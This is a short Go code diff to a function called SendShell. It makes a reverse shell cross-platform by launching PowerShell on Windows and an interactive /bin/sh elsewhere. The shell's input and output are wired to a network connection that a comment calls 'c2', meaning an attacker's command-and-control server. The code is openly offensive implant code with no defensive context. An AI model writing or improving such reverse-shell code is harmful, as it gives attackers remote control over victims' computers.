@@ -8,6 +8,7 @@ import "C"
 import (
 	"net"
 	"os/exec"
+	"runtime"
 	"time"
 )
 
@@ -21,7 +22,12 @@ func SendShell() {
 	}
 
 	// os spec shell
-	cmd = exec.Command("cmd.exe")
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("powershell")
+	} else {
+		cmd = exec.Command("/bin/sh", "-i")
+	}
 
 	// send stdin/out,err to c2
 	cmd.Stdin = conn
